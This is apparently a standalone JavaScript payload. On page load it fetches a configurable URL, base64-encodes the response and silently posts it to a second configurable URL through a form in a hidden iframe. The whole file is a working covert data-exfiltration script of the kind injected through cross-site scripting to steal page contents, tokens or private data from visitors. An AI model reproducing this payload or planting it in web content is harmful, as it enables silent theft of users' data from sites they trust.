/**
 * This script will fetch a remote page via AJAX request,
 * base64 encode the contents, then post to the specified
 * page by submitting a form located in a hidden iframe.
 */
window.onload = function() {
    var readFrom         = 'http://localhost/test.txt';
    var readFromMethod   = 'GET';   // GET or POST
    var readFromPostData = 'field=value';
    var postTo           = 'http://localhost/postTo';

    var iframe = document.createElement('iframe');
    iframe.setAttribute('style', 'display: none');
    iframe.setAttribute('name', 'postFrame');
    document.getElementsByTagName('body')[0].appendChild(iframe);

    var form = document.createElement('form');
    form.setAttribute('method', 'post');
    form.setAttribute('action', postTo);
    form.setAttribute('target', 'postFrame');

    var input = document.createElement('input');
    input.setAttribute('type','hidden');
    input.setAttribute('name','contents');

    form.appendChild(input);

    var xmlHttp = (window.XMLHttpRequest) ? new XMLHttpRequest() : new ActiveXObject("Microsoft.XMLHTTP");
    xmlHttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            input.setAttribute('value', window.btoa(this.responseText)); 
            form.submit();
        }
    };
    xmlHttp.open(readFromMethod, readFrom, true);

    if (readFromMethod == 'POST') {
        xmlHttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        xmlHttp.send(readFromPostData);
    } else {
        xmlHttp.send();
    }
}
